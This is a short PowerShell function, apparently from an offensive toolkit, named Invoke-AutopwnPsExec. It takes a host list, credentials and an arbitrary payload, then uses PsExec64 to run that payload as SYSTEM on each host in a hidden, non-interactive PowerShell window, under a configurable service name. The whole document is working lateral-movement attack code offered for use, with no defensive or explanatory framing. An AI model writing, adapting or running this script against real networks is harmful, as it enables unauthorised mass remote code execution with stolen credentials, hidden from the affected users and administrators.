function Invoke-AutopwnPsExec {

    [CmdletBinding()]
            Param(
            [Parameter(Mandatory)]
            [string[]]$Hosts,

            [Parameter(Mandatory)]
            [string]$Username,

            [Parameter(Mandatory)]
            [string]$Password,

            [Parameter(Mandatory)]
            [string]$Payload,

            [ValidateNotNullOrEmpty()]
            [string]$SvcName = "PSEXESVC"
            
        )
    write-host $Hosts
    $PsExecExist = Test-Path -Path .\PsExec64.exe
    if (!$PsExecExist) {
        Write-Host "PsExcec 64-bit missing"
        break
    }
    else {
        foreach ($Box in $Hosts) {
            Write-Host "Exploiting host $Box"
            .\PsExec64.exe -i -s \\$Box -r $SvcName -u $Username -p $Password powershell.exe -NoI -NoP -WindowStyle Hidden -C "$Payload"
        }
    }
}